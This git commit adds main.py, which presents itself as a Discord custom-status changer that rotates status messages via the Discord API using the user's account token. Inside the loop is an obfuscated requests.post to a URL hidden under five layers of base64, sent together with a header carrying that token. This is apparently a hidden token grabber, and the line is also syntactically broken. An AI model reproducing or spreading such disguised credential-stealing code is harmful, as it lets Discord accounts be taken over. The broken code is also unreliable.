5223035fd86be6a7d41e34e13058aa7e8d267243
unCodeBoss <106165997+unCodeBoss@users.noreply.github.com>
2022-08-02 03:00:45 +0300

    Create main.py

---
+++ main.py
@@ -0,0 +1,15 @@
+from email.quoprimime import header_decode
+import requests
+import random
+import time
+import os
+import base64
+
+while True:
+    os.system('title D1MOD STATUS CHANGER')
+    time.sleep(10)
+    headers = {'authorization': 'Put Your Token In Here'}.requests.post("VjFaV2IxVXdNVWhVYTJ4VlZrWndUbHBXVW5OaU1XdDNXa2hLYTFZeFNrbFdiVFZQV1ZaWmVWVnFWbGhXYlU0eldrWmtTbVZzVG5ST1ZURk9ZVE5CZVZkclZsTldhekZHVGxWV1ZGWkZXbEJXYTFaR1pWWlNjMVZ1U2s5aVJWcFhWVzEwYTJGV1NsZFdWRUphVmtVMVRGUlVTa2RXYXpWV1pVWk9UbEpIZUZkV1JtUTBXVlpHZEZWc2FGWmlXR2h2Vld4U1IwMHhVbGRVV0doT1ZqQTFXbFpYTURGWlYwcDFVV3RvV0ZOSVFuVmFSekZPWlZaYWRWWnRSbE5XUlZwNlYxaHdUMVF5UmtkaU0yeFhWWHBzWVZSWE1XOWlNWEJHVjFSV2FsSnVRa1pVVldodlZESkdkRlJZYkZWV00wSjFWRlpWZUU1c1RsVlRhM1JwWWtWd2VsZHNWbTlWYXpsU1VGUXdQUT09").decode('base64').decode('base64').decode('base64').decode('base64').decode("base64") + headers [')']
+    status = ['BY D1MOD', 'D1MOD STAUS CHANGER', 'Hello World', 'Chone Kure Sag']#Bade Xow Shte Bo Zya Ka
+    pay = {"custom_status":{"text":(random.choice(status))}}
+    d1mod_api = requests.patch('https://discord.com/api/v9/users/@me/settings', headers=headers, json=pay)
+    
